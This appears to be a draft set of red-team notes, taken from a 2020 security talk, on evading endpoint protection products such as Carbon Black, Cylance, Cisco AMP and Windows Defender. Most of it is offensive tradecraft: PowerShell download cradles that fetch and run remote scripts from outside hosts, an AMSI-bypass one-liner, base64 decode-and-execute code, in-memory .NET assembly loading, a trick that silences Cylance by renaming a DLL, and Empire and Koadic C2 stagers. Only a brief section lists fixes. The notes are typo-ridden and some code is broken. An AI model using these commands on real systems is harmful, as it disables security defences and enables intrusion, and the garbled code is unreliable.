---
description: 'Still a draft, much taken from BHIS Sacred Cash Cow 2020'
---

# Evading Endpoint Security

The year things changed  
  
  
Alternate interpreters.  
- Typically Python and Ruby  
- Bypassed:  
 → CrowdStrike  
 → Carbon Black  
 → Other AV vendors  
  
How do they get there?  
- Already installed  
- Unregistere interpreterer  
 → Security tool bundle. Executables laying around for other applications.  
 → Found in installation folder  
- Microsoft Store  
- Software Center  
- Administrator Privileges  
  
How do I fix it?  
- Restrict alternate interpretere deployments  
- Check the filesyustem and contact vendor  
- Restrict access to microsoft store  
- Review applicaiton published via SCCM  
- Restrict granting of administrator privileges.  
  


#### Carbon Black Configuration Case study

  
- Healthcare industry Company  
- Running Carbon Black, Windows Defender, etc  
- Relatively Mature Environment  
- However... **Allowed:**  
 → PowerShell  
 → Downloading ps1 files  
  
Not allowed:  
- Execution of PS1 files downloaded from GitHub  
- Execution of custom PS12 files  
- Via:  
 → Command Line  
 → PowerShell's Import-Module  
 → Calling from within a bash script  
  
Bypassing PS1 Restricityons:  
- Copy and paste contents of a PS1 file onto command line  
- Powershells Invoke-Expression  
  
 _iex\(new-object system.net.webclient\).downloadString\("https://any.com/file.ps1"\)_  
  
Cisco AMP EDR - Easy bypass  
**Used Koadic for C2**  
use: stager/js/wmic  
  
![file:///tmp/ct\_tmp/1.png](file:///tmp/ct_tmp/1.png)  
  
  
  
CYLANCEPROTECT buypass  
  
-Elevated privileges to SSYSTEM  
- Cylance still blocking suspicious behaviour  
- Cylance blocked all of these:  
 → AndrewSpecial  
 → Meterpreter Kiwi code  
 → Process explorer  
 → ProcDump.exe  
- Unable to stop the cylance service or kill the process  
  
Solution:  
 Rename a Cylance DLL to stop behaviour detection/prevention  
 - written by dru1d  
![file:///tmp/ct\_tmp/2.png](file:///tmp/ct_tmp/2.png)  
Cylance process keep running while this is done  
- No alers sent to the security team  
- Detection easy to re-enable by restoring the original filename  
- ![file:///tmp/ct\_tmp/3.png](file:///tmp/ct_tmp/3.png)  
- Requires local admin/SYSTEM  
  
  
Windows Defender and Carbon Black Byupass  
  
-Step 1  
- Sart powershell empire listener and get stager code  
  
Step 2 - Run the launcher code in memeory using this powershell commmand.  
  
 IEX\(New-Object System.Net.WebClient\).DownloadString\('https://iiaif.com/launcher.txt'\)  
This only works with windows defender  
  
Step 3 - To get the script to ruin, use the follwouing command to bypass AMSI:  
 _$m = “System.Management.Automation.Ams”; \[Ref\].Assembly.GetType\("$m" + “iUtils”\).GetField\('amsiInitFai'+'led', ‘NonPublic,Static’\).SetValue \($null,$true\)_  
  
  


#### Windows Subsystem for Linux

  
Running elf files on windows will often work!  
Microsoft store lets you install Python3.8 WITHOUT ADMIN!  
Fully operational Python C2.  
  
  


#### PowerShell HGTTP Web Crade for Downloads

 \(Joff\)  
. Download a Powershell script  
Helps to base64 encode the script first then downlaod  
Download, decode the use “iex” to put in memory  
Nothing touches disk  
  
 _wc = New-OPbjeckt syustem.webclient  
 $p = wc.DownloadString\("http:8458844.pv.b64"\)  
 $sc = \[System.Text.Encoding\]::UTF8.GetString\(\[System.Convert\]::FromBase64String\($p\)\)  
 iex $sc_  
  
  
AMSI can be annoying  
If downgrade attack is now working, we need to bypass AMSI often.  
  
Strip comments off the powershelll script  
- Powerstrip.py  
Goes through all comments and removes them. And writes a strippped version to this.  
Joff Thyer: PowerStrip  
You rarely need to obfuscate it heavy  
![file:///tmp/ct\_tmp/4.png](file:///tmp/ct_tmp/4.png)  
  
Run a custom Assembly DLL  
  
You can run any .NET really. Download into a powershell cradle and invoke any method in that.  
  
Fetch from HTTP, Create Object, Profit:  
  
 _$p = $wc.DownloadString\("http.."\)  
 $a = \[System.Convert\]::FromBase64String\($p\)  
 \[System.Reflection.Assembly\]::Load\($a\)  
 z = New-Object ClassLibrary1.Class1  
 $z.Invoke\(\)_  
  
  
Class Library

